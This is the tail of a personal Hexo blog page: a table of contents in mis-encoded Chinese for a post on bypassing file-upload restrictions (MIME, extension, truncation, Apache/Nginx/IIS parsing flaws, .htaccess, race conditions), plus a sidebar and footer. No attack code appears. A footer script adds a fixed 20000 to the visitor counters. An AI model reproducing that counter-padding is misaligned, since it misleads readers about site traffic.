          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">å‰ç«¯ç»•è¿‡</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">åç«¯ç»•è¿‡</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E7%89%B9%E6%80%A7"><span class="nav-number">2.1.</span> <span class="nav-text">å‡½æ•°ç‰¹æ€§</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%B6%E5%AE%83"><span class="nav-number">2.1.0.0.1.</span> <span class="nav-text">å…¶å®ƒ</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B%EF%BC%88MINE%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B%EF%BC%89"><span class="nav-number">2.1.1.</span> <span class="nav-text">æœåŠ¡ç«¯æ£€æµ‹ï¼ˆMINEç±»å‹æ£€æµ‹ï¼‰ </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B%EF%BC%88%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84%E6%A3%80%E6%B5%8B%EF%BC%89"><span class="nav-number">2.1.2.</span> <span class="nav-text">æœåŠ¡ç«¯æ£€æµ‹ï¼ˆç›®å½•è·¯å¾„æ£€æµ‹ï¼‰ </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B%EF%BC%88%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%A3%80%E6%B5%8B%EF%BC%89"><span class="nav-number">2.1.3.</span> <span class="nav-text">æœåŠ¡ç«¯æ£€æµ‹ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰ </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB"><span class="nav-number">2.1.4.</span> <span class="nav-text">æ–‡ä»¶æˆªæ–­ç»•è¿‡æ”»å‡» </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB"><span class="nav-number">2.1.5.</span> <span class="nav-text">è§£ææ¼æ´æ”»å‡» </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90"><span class="nav-number">2.1.5.1.</span> <span class="nav-text">ç›®å½•è§£æ </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="nav-number">2.1.5.2.</span> <span class="nav-text">æ–‡ä»¶è§£æ </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.5.3.</span> <span class="nav-text">Apacheè§£ææ¼æ´ </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.5.4.</span> <span class="nav-text">Nginxè§£ææ¼æ´ </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS7-5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.5.5.</span> <span class="nav-text">IIS7.5è§£ææ¼æ´ </span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="nav-number">2.1.6.</span> <span class="nav-text">ç«äº‰æ¡ä»¶æ”»å‡» </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">2.1.7.</span> <span class="nav-text">åŒæ–‡ä»¶ä¸Šä¼  </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php3457"><span class="nav-number">2.1.8.</span> <span class="nav-text">php3457 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#htaccess%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB"><span class="nav-number">2.1.9.</span> <span class="nav-text">.htaccessæ–‡ä»¶æ”»å‡» </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A3%80%E6%B5%8B%EF%BC%88%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B%EF%BC%89"><span class="nav-number">2.1.10.</span> <span class="nav-text">æœåŠ¡å™¨æ£€æµ‹ï¼ˆæ–‡ä»¶å†…å®¹æ£€æµ‹ï¼‰ </span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%B9%BB%E6%95%B0%E6%A3%80%E6%B5%8B%EF%BC%88%E6%96%87%E4%BB%B6%E5%BC%80%E5%A4%B4%EF%BC%89"><span class="nav-number">2.1.10.1.</span> <span class="nav-text">æ–‡ä»¶å¹»æ•°æ£€æµ‹ï¼ˆæ–‡ä»¶å¼€å¤´ï¼‰ </span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E6%A3%80%E6%B5%8B"><span class="nav-number">2.1.10.2.</span> <span class="nav-text">æ–‡ä»¶ç›¸å…³ä¿¡æ¯æ£€æµ‹ </span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E7%9A%84%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.11.</span> <span class="nav-text">æ–‡ä»¶ä¸Šä¼ ä¸­çš„ç›®å½•ç©¿è¶Šæ¼æ´ </span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">æ”»å‡»ä»£ç  </span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9%EF%BC%9A"><span class="nav-number">2.3.</span> <span class="nav-text">æ–‡ä»¶å‹ç¼©ï¼š</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81"><span class="nav-number">2.3.1.</span> <span class="nav-text">å¸¸ç”¨æ”»å‡»ä»£ç  </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E5%AE%83%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81"><span class="nav-number">2.3.2.</span> <span class="nav-text">å…¶å®ƒæ”»å‡»ä»£ç  </span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9B%B4%E5%A4%9A%E5%8F%82%E8%80%83"><span class="nav-number">2.4.</span> <span class="nav-text">æ›´å¤šå‚è€ƒ </span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="chleynx"
      src="/images/ch.jpg">
  <p class="site-author-name" itemprop="name">chleynx</p>
  <div class="site-description" itemprop="description">ä¸æ˜¯çœ‹åˆ°å¸Œæœ›æ‰åšæŒï¼Œè€Œæ˜¯åšæŒäº†æ‰èƒ½çœ‹åˆ°å¸Œæœ›</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">12</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/chensonghi/chensonghi.github.io/" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;chensonghi&#x2F;chensonghi.github.io&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/c582037" title="CSDN â†’ https:&#x2F;&#x2F;blog.csdn.net&#x2F;c582037" rel="noopener" target="_blank"><i class="codiepie fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2023-10-8 â€“ 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chleynx</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

    <span id="busuanzi_container_site_pv">æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡</span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_uv">æ€»è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº</span>
    <span class="post-meta-divider">|</span>
<!-- ä¸è’œå­è®¡æ•°åˆå§‹å€¼çº æ­£ -->
<script>
$(document).ready(function() {

    var int = setInterval(fixCount, 50);  // 50mså‘¨æœŸæ£€æµ‹å‡½æ•°
    var countOffset = 20000;  // åˆå§‹åŒ–é¦–æ¬¡æ•°æ®

    function fixCount() {            
       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
        {
            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
            clearInterval(int);
        }                  
        if ($("#busuanzi_container_site_pv").css("display") != "none")
        {
            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // åŠ ä¸Šåˆå§‹æ•°æ® 
            clearInterval(int); // åœæ­¢æ£€æµ‹
        }  
    }
       	
});
</script> 


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="æ€»è®¿å®¢é‡">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="æ€»è®¿é—®é‡">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.3' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
